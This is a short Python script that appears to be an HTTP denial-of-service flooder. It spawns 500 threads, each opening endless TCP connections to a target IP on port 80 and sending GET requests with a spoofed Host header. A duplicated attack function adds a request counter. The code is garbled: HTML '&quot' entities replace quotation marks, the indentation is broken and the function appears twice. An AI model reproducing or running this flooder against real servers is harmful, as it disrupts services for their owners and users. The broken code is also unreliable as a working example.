import socket 
import threading
target_ip = '10.0.0.138' 
fake_ip = '182.21.20.32' 
port = 80
def attack(): 
    while True: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((target_ip, port)) 
        s.sendto((&quotGET /&quot + target_ip + &quot HTTP/1.1\r\n&quot).encode('ascii'), (target_ip, port)) 
        s.sendto((&quotHost: &quot + fake_ip + &quot\r\n\r\n&quot).encode('ascii'), (target_ip, port)) 
        s.close()
        for _ in range(500): 
    thread = threading.Thread(target=attack) 
    thread.start()
    attack_num = 0 

def attack(): 
    while True: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((target_ip, port)) 
        s.sendto((&quotGET /&quot + target_ip + &quot HTTP/1.1\r\n&quot).encode('ascii'), (target_ip, port)) 
        s.sendto((&quotHost: &quot + fake_ip + &quot\r\n\r\n&quot).encode('ascii'), (target_ip, port)) 

        global attack_num 
        attack_num += 1 
        print(attack_num) 

        s.close()
        
